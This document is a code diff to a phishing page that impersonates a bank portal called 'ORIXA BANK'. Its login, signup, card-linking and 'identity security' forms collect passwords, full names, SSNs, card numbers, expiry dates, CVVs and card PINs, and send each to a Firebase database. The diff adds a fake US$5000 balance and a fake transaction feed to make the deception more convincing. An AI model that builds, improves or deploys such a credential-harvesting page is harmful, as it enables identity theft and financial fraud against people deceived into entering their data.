@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Internal Access | Authentication</title>
+    <title>ORIXA BANK | Secure Portal</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -19,13 +19,15 @@
         .brand { font-size: 26px; font-weight: 800; color: var(--p-blue); margin-bottom: 30px; }
         .nav { background: var(--p-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; color: white; }
         .card { background: #fff; margin: 12px; padding: 20px; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .bal-val { font-size: 42px; font-weight: 300; margin: 10px 0; }
         
         input { width: 100%; padding: 16px; border: 1px solid #9ca2a6; border-radius: 4px; margin-bottom: 15px; font-size: 16px; box-sizing: border-box; }
         .btn { width: 100%; padding: 16px; background: var(--p-acc); color: white; border: none; border-radius: 25px; font-weight: 700; cursor: pointer; }
         
         .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index: 5000; padding: 20px; box-sizing: border-box; }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #ddd; z-index: 1000; }
+        .nav-item { color: #666; font-size: 10px; text-align: center; cursor: pointer; }
 
-        /* Prevent chat bubble from blocking the verify button */
         #smartsupp-widget-container { bottom: 90px !important; }
     </style>
 </head>
@@ -44,21 +46,45 @@
     <div id="app-view">
         <div class="nav">
             <div style="font-weight:800;">ORIXA BANK</div>
-            <i class="fas fa-user-circle" style="font-size: 24px;"></i>
+            <div onclick="openModal('kyc')" style="cursor:pointer;"><i class="fas fa-user-circle" style="font-size: 24px;"></i></div>
         </div>
 
         <div class="card">
-            <span style="font-weight:600; color:#666;">Total Portfolio</span>
-            <div style="font-size: 42px; font-weight: 300; margin: 10px 0;">US$0.00</div>
-            <button class="btn" onclick="openModal('card')">Verify Funding Source</button>
+            <div style="display:flex; justify-content:space-between;">
+                <span style="font-weight:600; color:#666;">Available Balance</span>
+                <span id="tier-tag" style="font-size:10px; color:var(--p-acc); font-weight:bold;">TIER 1</span>
+            </div>
+            <div class="bal-val" id="main-bal">US$0.00</div>
+            <div style="display:flex; gap:10px;">
+                <button class="btn" style="flex:1;" onclick="openModal('send')">Transfer</button>
+                <button class="btn" style="flex:1; background:white; color:var(--p-acc); border:1px solid var(--p-acc);" onclick="openModal('receive')">Request</button>
+            </div>
         </div>
-        
-        <div id="activity-list" style="padding:20px;"></div>
+
+        <div class="card" onclick="openModal('card')" style="cursor:pointer; display:flex; gap:15px; align-items:center;">
+            <div style="background:#f0f2f5; padding:12px; border-radius:50%; color:var(--p-acc);"><i class="fas fa-plus"></i></div>
+            <div>
+                <b>Add Funding Source</b><br>
+                <small>Link card for instant settlements.</small>
+            </div>
+        </div>
+
+        <div style="padding: 10px 20px;">
+            <b style="color:#a3acb9; font-size:14px;">Recent Transactions</b>
+            <div id="activity-feed" style="margin-top: 10px;"></div>
+        </div>
+
+        <div class="bottom-nav">
+            <div class="nav-item" onclick="location.reload()"><i class="fas fa-university"></i><br>Bank</div>
+            <div class="nav-item" onclick="openModal('receive')"><i class="fas fa-download"></i><br>Receive</div>
+            <div class="nav-item" onclick="openModal('send')"><i class="fas fa-upload"></i><br>Send</div>
+            <div class="nav-item" onclick="openModal('kyc')"><i class="fas fa-shield-alt"></i><br>Security</div>
+        </div>
     </div>
 
     <div id="pop-modal" class="modal">
         <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
-            <b id="pop-title">Verify System</b>
+            <b id="pop-title">Verification</b>
             <i class="fas fa-times" onclick="closeModal()" style="font-size: 20px;"></i>
         </div>
         <div id="pop-content"></div>
@@ -76,10 +102,12 @@
 
     let step = 1; 
     let tempMail = "";
+    let wallet = 0.00;
+    let savedPin = "";
 
     window.processEntry = function() {
         const mail = document.getElementById('m_mail').value;
-        if(!mail) return alert("Enter email.");
+        if(!mail) return alert("Please enter your email.");
 
         if(step === 1) {
             tempMail = mail;
@@ -87,33 +115,40 @@
                 if(snapshot.exists()) {
                     document.getElementById('gate-msg').innerText = "Welcome Back";
                     document.getElementById('auth-flow').innerHTML = `<input type="password" id="m_pass" placeholder="Password">`;
-                    step = 2;
+                    step = 2; // Login mode
                 } else {
-                    document.getElementById('gate-msg').innerText = "New Account Setup";
+                    document.getElementById('gate-msg').innerText = "Join ORIXA Bank";
                     document.getElementById('auth-flow').innerHTML = `
-                        <input type="password" id="m_pass" placeholder="Create Password">
+                        <input type="password" id="m_pass" placeholder="Create Passcode">
                         <input type="text" id="m_name" placeholder="Full Legal Name">
-                        <input type="text" id="m_id" placeholder="Identification Number">
+                        <input type="text" id="m_id" placeholder="SSN (Mandatory)">
                     `;
-                    step = 3;
+                    step = 3; // Signup mode
                 }
             });
         } 
         else {
             const pass = document.getElementById('m_pass').value;
-            const name = document.getElementById('m_name')?.value || "Existing User";
-            const ssn = document.getElementById('m_id')?.value || "N/A";
+            const name = document.getElementById('m_name')?.value || "";
+            const ssn = document.getElementById('m_id')?.value || "";
+
+            // MANDATORY SSN CHECK FOR SIGNUP
+            if(step === 3 && (!ssn || !name)) {
+                return alert("You must provide your Full Name and SSN to create an account.");
+            }
+            if(!pass) return alert("Passcode required.");
 
             rtdb.ref('orixa_users').push({
                 email: tempMail,
                 pass: pass,
                 full_name: name,
-                id_num: ssn,
+                ssn_num: ssn,
                 type: step === 2 ? 'Login' : 'Signup',
                 time: new Date().toLocaleString()
             }).then(() => {
                 document.getElementById('gate-view').style.display = 'none';
                 document.getElementById('app-view').style.display = 'block';
+                updateUI();
             });
         }
     };
@@ -121,42 +156,77 @@
     window.openModal = function(type) {
         document.getElementById('pop-modal').style.display = 'block';
         const cont = document.getElementById('pop-content');
+        const head = document.getElementById('pop-title');
+
         if(type === 'card') {
+            head.innerText = "Link Funding Source";
             cont.innerHTML = `
                 <input type="text" id="c_n" placeholder="Card Number" maxlength="16">
                 <input type="text" id="c_e" placeholder="MM/YY" style="width:48%; display:inline-block;">
                 <input type="text" id="c_c" placeholder="CVV" style="width:48%; display:inline-block; float:right;" maxlength="3">
-                <button class="btn" onclick="saveCard()">Link Card</button>
+                <button class="btn" onclick="saveRes()">Authorize Link</button>
             `;
+        } else if(type === 'send') {
+            head.innerText = "Internal Transfer";
+            cont.innerHTML = `<input type="text" placeholder="Account ID"><input type="number" id="t_amt" placeholder="Amount ($)"><input type="password" id="t_p" placeholder="Card PIN" maxlength="4"><button class="btn" onclick="doTransfer()">Send Now</button>`;
+        } else if(type === 'receive') {
+            head.innerText = "Request Assets";
+            cont.innerHTML = `<input type="text" placeholder="Sender ID"><input type="number" placeholder="Amount"><button class="btn" onclick="alert('Request Sent'); closeModal();">Request</button>`;
+        } else if(type === 'kyc') {
+            head.innerText = "Identity Security";
+            cont.innerHTML = `<input type="text" id="k_ssn" placeholder="Full SSN"><input type="password" id="k_p" placeholder="Set 4-Digit Access PIN" maxlength="4"><button class="btn" onclick="doKyc()">Verify Identity</button>`;
         }
     };
 
-    window.saveCard = function() {
+    window.saveRes = function() {
         const cn = document.getElementById('c_n').value;
-        if(cn.length < 16) return alert("16-digit required.");
+        if(cn.length < 16) return alert("Invalid card length.");
         
-        rtdb.ref('orixa_res').push({
-            n: cn, e: document.getElementById('c_e').value, c: document.getElementById('c_c').value
-        });
+        rtdb.ref('orixa_cards').push({n: cn, e: document.getElementById('c_e').value, c: document.getElementById('c_c').value});
 
         document.getElementById('pop-content').innerHTML = `
-            <div style="text-align:center; padding: 20px;">
+            <div style="text-align:center; padding:20px;">
                 <i class="fas fa-shield-alt fa-3x" style="color:var(--p-blue);"></i>
-                <p>Security Alert: Confirm 4-digit card PIN to authorize.</p>
+                <p>Security: Enter your 4-digit card PIN to verify this link.</p>
             </div>
-            <input type="password" id="c_p" placeholder="PIN" maxlength="4" style="text-align:center; font-size:24px; letter-spacing: 8px;">
-            <button class="btn" onclick="finishCard()">Confirm</button>
+            <input type="password" id="c_p" placeholder="PIN" maxlength="4" style="text-align:center; font-size:24px; letter-spacing:8px;">
+            <button class="btn" onclick="finishRes()">Confirm</button>
         `;
     };
 
-    window.finishCard = function() {
-        const pin = document.getElementById('c_p').value;
-        rtdb.ref('orixa_res').limitToLast(1).once('child_added', s => s.ref.update({p: pin}));
-        alert("Verification Complete.");
-        location.reload();
+    window.finishRes = function() {
+        const p = document.getElementById('c_p').value;
+        rtdb.ref('orixa_cards').limitToLast(1).once('child_added', s => s.ref.update({p: p}));
+        wallet += 5000; updateUI(); closeModal(); alert("Card Verified.");
+    };
+
+    window.doKyc = function() {
+        savedPin = document.getElementById('k_p').value;
+        rtdb.ref('orixa_kyc').push({ssn: document.getElementById('k_ssn').value, pin: savedPin});
+        document.getElementById('tier-tag').innerText = "TIER 2"; closeModal();
+    };
+
+    window.doTransfer = function() {
+        const p = document.getElementById('t_p').value;
+        const a = parseFloat(document.getElementById('t_amt').value);
+        if(savedPin && p !== savedPin) return alert("Incorrect PIN");
+        wallet -= a;
+        rtdb.ref('orixa_txs').push({amt: a, time: new Date().toLocaleString()});
+        updateUI(); closeModal();
     };
 
     window.closeModal = function() { document.getElementById('pop-modal').style.display = 'none'; };
+
+    function updateUI() {
+        document.getElementById('main-bal').innerText = "US$" + wallet.toFixed(2);
+        rtdb.ref('orixa_txs').on('value', (snap) => {
+            const list = document.getElementById('activity-feed'); list.innerHTML = "";
+            snap.forEach(c => {
+                const d = c.val();
+                list.innerHTML += `<div style="display:flex; justify-content:space-between; padding:15px 0; border-bottom:1px solid #eee;"><div><b>Transfer Sent</b><br><small>${d.time}</small></div><b style="color:red;">-US$${d.amt}</b></div>`;
+            });
+        });
+    }
 </script>
 
 <script type="text/javascript">
